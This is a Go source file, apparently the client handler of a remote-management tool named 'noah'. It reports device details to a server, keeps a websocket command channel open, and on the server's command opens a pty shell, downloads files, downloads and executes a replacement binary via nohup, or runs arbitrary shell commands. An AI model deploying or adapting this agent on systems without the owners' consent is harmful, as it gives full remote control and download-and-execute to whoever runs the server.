package handler

import (
	"encoding/json"
	"fmt"
	"math"
	"net/http"
	"noah/client/app/environment"
	"noah/client/app/service"
	"noah/client/app/utils/encode"
	"os"
	"os/exec"
	"strconv"
	"time"

	"noah/client/app/gateway"
	ws "noah/client/app/infrastructure/websocket"

	"noah/client/app/entitie"

	"github.com/gorilla/websocket"
)

type Handler struct {
	Configuration *environment.Configuration
	Gateway       gateway.Gateway
	Services      *service.Services
	ClientID      uint
	Connected     bool
	Connection    *websocket.Conn
}

func NewHandler(
	configuration *environment.Configuration,
	gateway gateway.Gateway,
	services *service.Services,
) *Handler {
	return &Handler{
		Configuration: configuration,
		Gateway:       gateway,
		Services:      services,
	}
}

// KeepConnection heart-beat
func (h *Handler) KeepConnection() {
	sleepTime := 30 * time.Second

	for {
		if h.Connected {
			time.Sleep(sleepTime)
		}

		err := h.ServerIsAvailable()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		h.Connected = true
	}
}

func (h *Handler) Log(v ...any) {
	fmt.Println(v...)
}

// SendDeviceSpecs Report device information
func (h *Handler) SendDeviceSpecs() (id uint, err error) {
	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
	if err != nil {
		return 0, err
	}
	body, err := json.Marshal(deviceSpecs)
	if err != nil {
		return 0, err
	}
	res, err := h.Gateway.NewRequest(http.MethodPost, "/client/device", body)
	if err != nil {
		return 0, err
	}
	if res.Code != 0 {
		return 0, fmt.Errorf("error with status code: %d, msg: %s", res.Code, res.Msg)
	}
	return uint(math.Ceil(res.Data.(float64))), nil
}

func (h *Handler) ServerIsAvailable() error {
	res, err := h.Gateway.NewRequest(http.MethodGet, "/client/health/"+strconv.FormatUint(uint64(h.ClientID), 10), nil)
	if err != nil {
		return err
	}
	if res.Code != 0 {
		return fmt.Errorf("error with status code: %d, msg: %s", res.Code, res.Msg)
	}
	return nil
}

func (h *Handler) Reconnect() {
	h.Connected = false
	for {
		conn, err := ws.NewConnection(h.Configuration, "/client/ws/"+fmt.Sprint(h.ClientID))
		if err != nil {
			h.Log("[!] Error CmdReconnect on WS: ", err.Error())
			time.Sleep(time.Second * 10)
			continue
		}

		h.Connection = conn
		h.Connected = true
		h.Log("[*] CmdConnection Successfully connected")
		break
	}
}

func (h *Handler) HandleCommand() {
	for {
		if !h.Connected {
			h.Reconnect()
			continue
		}

		_, message, err := h.Connection.ReadMessage()
		if err != nil {
			h.Log("[!] Error reading from connection:", err)
			h.Reconnect()
			continue
		}

		var request entitie.Command
		if err := json.Unmarshal(message, &request); err != nil {
			continue
		}

		var response []byte
		var hasError bool

		switch request.Command {
		case "getos":
			deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			} else {
				response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
			}
		case "pty":
			p := request.Parameter
			conn, err := ws.NewConnection(h.Configuration, "/pty/client/ws/"+p)
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			go h.Services.Pty.Run(conn)
		case "download":
			p := request.Parameter
			//json字符串转map
			var m map[string]string
			err := json.Unmarshal([]byte(p), &m)
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
			// 下载文件
			err = h.Services.Download.DownloadFile(m["filename"], m["path"])

			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
		case "update":
			filename := request.Parameter

			// 下载文件
			filepath := "/tmp/" + filename
			err = h.Services.Download.DownloadFile(filename, filepath)

			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
				break
			}

			// 设置新版本文件的执行权限
			err = os.Chmod(filepath, 0755)
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
				break
			}
			// 使用 nohup 命令启动新进程
			cmd := exec.Command("nohup", filepath, "&")

			// 重定向标准输出和错误输出到 /dev/null
			//cmd.Stdout = os.DevNull
			//cmd.Stderr = os.DevNull

			err = cmd.Start()
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
				return
			}

			// 等待一段时间以确保新进程已经启动
			time.Sleep(1 * time.Second)

			// 确保新进程已经启动后再退出当前进程
			os.Exit(0)

		default:
			response, err = h.RunCommand(request.Command)
			if err != nil {
				hasError = true
				response = encode.StringToByte(err.Error())
			}
		}

		body, err := json.Marshal(entitie.Command{
			ClientID: h.ClientID,
			Response: response,
			HasError: hasError,
		})
		if err != nil {
			continue
		}

		err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
		if err != nil {
			continue
		}
	}
}

func (h *Handler) RunCommand(command string) ([]byte, error) {
	return h.Services.Terminal.Run(command)
}
